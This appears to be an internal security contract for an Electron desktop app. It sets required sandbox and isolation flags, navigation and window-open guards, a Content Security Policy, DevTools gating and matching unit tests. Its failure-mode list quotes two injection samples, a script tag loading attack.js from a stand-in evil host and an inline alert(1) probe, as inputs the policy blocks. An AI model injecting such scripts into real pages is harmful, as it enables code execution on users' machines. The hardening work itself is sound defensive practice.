# Contract: `webPreferences` baseline and renderer security envelope

**Scope**: internal contract enforced at window creation time in `app/main/index.ts` and at build time in the renderer HTML transform.
**Status**: tightened by feature 002-security-hardening.

## Mandatory `webPreferences` flags

The main application window MUST be created with the following `webPreferences` values, all stated explicitly:

| Flag | Required value | Rationale |
|---|---|---|
| `sandbox` | `true` | The renderer process runs in the Chromium sandbox. This is the single most important Electron security primitive. |
| `contextIsolation` | `true` | The preload bridge is the only channel from renderer to main. Scripts in the renderer cannot directly reach Node APIs exposed by the preload. |
| `nodeIntegration` | `false` | Node APIs are not accessible from the renderer. Any Node capability must be exposed through the preload bridge. |
| `webSecurity` | `true` | Same-origin policy and mixed-content blocking are enforced. Never disabled, including in development. |
| `preload` | path to the compiled preload script | Unchanged from current implementation. |

Any future `webPreferences` addition that is security-relevant MUST be explicit in the same way.

## Mandatory navigation handlers

After `createWindow()` returns a `BrowserWindow` instance, and before the window loads content, the following handlers MUST be attached to the instance's `webContents`:

### `will-navigate`

```
webContents.on("will-navigate", (event, targetUrl) => {
  // If targetUrl is not in the allowlist of origins computed at window creation,
  // call event.preventDefault().
  // If targetUrl is an http(s) URL, additionally call shell.openExternal(targetUrl).
})
```

The allowlist of origins is:

- In production, the `file://` origin of the loaded renderer file.
- In development, the origin of `process.env.ELECTRON_RENDERER_URL` (the Vite dev server).

### `setWindowOpenHandler`

```
webContents.setWindowOpenHandler(({ url }) => {
  // If url is an http(s) URL, call shell.openExternal(url) and return { action: "deny" }.
  // Otherwise return { action: "deny" }.
})
```

No call to `setWindowOpenHandler` is allowed to return `{ action: "allow" }` without explicit same-origin verification. Since the current UI does not open additional windows, the simplest safe policy is to deny all `window.open` calls.

## Mandatory content security policy

The renderer HTML shipped with production builds MUST contain exactly one `<meta http-equiv="Content-Security-Policy">` element inside `<head>`. The `content` attribute MUST be a single directive string equivalent to:

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
font-src 'self' data:;
connect-src 'self';
object-src 'none';
base-uri 'self';
frame-ancestors 'none';
form-action 'self'
```

(Directives may be joined by spaces or newlines in the actual file; the normalized directive set is what the contract enforces.)

The renderer HTML shipped with development builds MAY contain a relaxed policy that permits the Vite hot-module-replacement pipeline. The relaxed policy differs from production only in:

- `script-src 'self' 'unsafe-inline' 'unsafe-eval'` (adds inline and eval, both required by Vite HMR).
- `connect-src 'self' ws: http://localhost:* http://127.0.0.1:*` (adds the websocket transport used by HMR).
- `default-src` gains `ws:` for the same reason.

No other directive is weakened between production and development.

## Mandatory DevTools gating

In production builds, the main window MUST NOT automatically open DevTools. In addition, an optional but recommended defense is to listen for `devtools-opened` on the window's `webContents` and immediately call `closeDevTools()`. This prevents accidental DevTools opening via keyboard shortcut by a user who forgot they were in a production build.

In development builds, DevTools MAY be opened automatically for convenience, as the current code already does.

## Recognised failure modes (these are expected outcomes, not bugs)

Under the contract above, the following behaviors are expected and must not be reported as regressions:

1. A link in the renderer pointing to `https://example.com` is intercepted. The click does not navigate the window. The link opens in the user's default browser. If the user is offline or has no default browser, nothing happens; the renderer window is unchanged.
2. A deliberate `<script src="https://evil.example/attack.js"></script>` injected into the DOM by developer tools is refused by the browser content policy. No network request is issued for `attack.js`. The browser console prints a CSP violation message.
3. An inline `<script>alert(1)</script>` injected into the DOM in production is refused. The browser console prints a CSP violation message. No alert is shown.
4. A `window.open('https://example.com', '_blank')` call from the renderer returns without opening a new Electron window. The URL is delegated to the user's default browser.
5. A `devtools-opened` event in production causes immediate `closeDevTools`. The DevTools panel flashes briefly and closes.

## Testing notes

The contract is enforced by three unit tests:

1. `tests/unit/webpreferences-hardening.test.ts` — instantiates `createWindow()` with a stubbed `BrowserWindow` constructor that captures its constructor arguments, asserts the four mandatory flags and the preload path.
2. `tests/unit/navigation-guards.test.ts` — instantiates a stubbed `BrowserWindow` whose `webContents` records the handlers attached, then fires synthetic navigation and window-open events and asserts the correct decisions.
3. `tests/unit/csp-injection.test.ts` — runs the production and development renderer HTML through the build-time injection and asserts the presence and shape of the CSP meta element. Does not exercise Electron; operates purely on the HTML transformation.

The end-to-end verification is handled by `scripts/real-app-audit.mjs`, which launches the built application and walks the canonical user journey. Any regression caused by the hardening surfaces as a failed step in the audit.

## Preconditions

- The preload script (`app/preload/index.ts`) uses `contextBridge.exposeInMainWorld` for all exposed APIs. (Already the case; verified in `research.md` D8.)
- The renderer never issues outbound HTTP requests in production. (Confirmed by the local-first constitution principle.)

## Non-obligations

- The contract does NOT require inspecting the behavior of extensions or developer tools installed by the user on the host operating system.
- The contract does NOT require verifying the integrity of the preload script at load time; this is a follow-up hardening for a later chantier.
- The contract does NOT require the CSP to be delivered via HTTP headers in addition to the meta element; the meta element is sufficient for the Electron context and simpler to version-control.
